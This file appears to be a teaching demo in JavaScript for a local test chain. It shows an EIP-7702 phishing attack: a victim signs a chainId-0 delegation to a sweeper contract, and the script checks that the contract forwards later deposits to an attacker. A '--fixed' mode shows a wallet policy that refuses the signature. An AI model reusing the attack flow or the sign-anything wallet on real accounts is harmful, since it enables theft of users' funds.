// Attack #1: a phishing EIP-7702 signature. The victim signs an authorization with
// chainId 0 (valid on every chain) delegating their EOA to our sweeper. After that,
// every deposit into the victim is forwarded to the attacker.
//   node demos/01-sweeper.mjs           victim signs it; 3 deposits of 1 ETH are swept
//   node demos/01-sweeper.mjs --fixed   the wallet policy refuses to sign the delegation
import { startChain, stopChain, deploy, roles, abis, delegate, codeOf, walletFor,
  pub, ethBalance, setEth, fmtEth, short, nonceOf, parseEther } from "../lib/chain.mjs";
import { makeWalletSigner, PolicyError } from "../lib/wallet-policy.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "sweeper-fixed" : "sweeper", fixed ? "7702 sweeper, fixed" : "7702 sweeper");
await startChain();

const sweeper = await deploy("sweeper", [roles.attacker.address]); // forwards to the attacker
await setEth(roles.victim.address, 0); // victim starts empty; deposits arrive during the demo
await setEth(roles.attacker.address, 0);

const vetted = await deploy("self"); // a delegate the wallet team has reviewed
t.say(`victim ${short(roles.victim.address)} is asked to sign a 7702 authorization`);
t.cmd(`sign authorization: delegate ${short(sweeper)}, chainId 0`);

// Vulnerable: a wallet that signs whatever it is shown. Fixed: the same request goes
// through a wallet policy whose allowlist holds only reviewed delegates.
const wallet = fixed
  ? makeWalletSigner(roles.victim, { allowlist: [vetted] })
  : { signDelegation: ({ chainId, delegate: d, nonce }) => roles.victim.signAuthorization({ chainId: Number(chainId), nonce, address: d }) };
const asks = fixed ? [0n, BigInt(await pub.getChainId())] : [0n]; // the phisher retries with this chain's id
for (const chainId of asks) {
  try {
    const auth = await wallet.signDelegation({ chainId, delegate: sweeper, nonce: await nonceOf(roles.victim.address) });
    await pub.waitForTransactionReceipt({ hash: await walletFor(roles.relayer).sendTransaction({ authorizationList: [auth], to: roles.relayer.address }) });
    t.bad(`  signed (chainId ${chainId}) → victim now runs ${short(sweeper)}`);
    break;
  } catch (e) {
    if (!(e instanceof PolicyError)) throw e;
    t.ok(`  REFUSED (chainId ${chainId}): ${e.message}`);
  }
}

t.cmd("send 1 ETH to the victim, three times");
for (let i = 0; i < 3; i++) {
  const hash = await walletFor(roles.relayer).sendTransaction({ to: roles.victim.address, value: parseEther("1") });
  await pub.waitForTransactionReceipt({ hash });
}
const code = await codeOf(roles.victim.address); // read from chain: is the account delegated?
const vbal = await ethBalance(roles.victim.address);
const swept = await ethBalance(roles.attacker.address);
if (code && code !== "0x") t.bad(`  victim runs ${code.slice(0, 10)}… → each deposit swept`);
else t.ok("  victim has no code → deposits stayed");
t.big(`balance ${fmtEth(vbal)} · swept ${fmtEth(swept)} ETH`);
t.save(); stopChain(); process.exit(0);
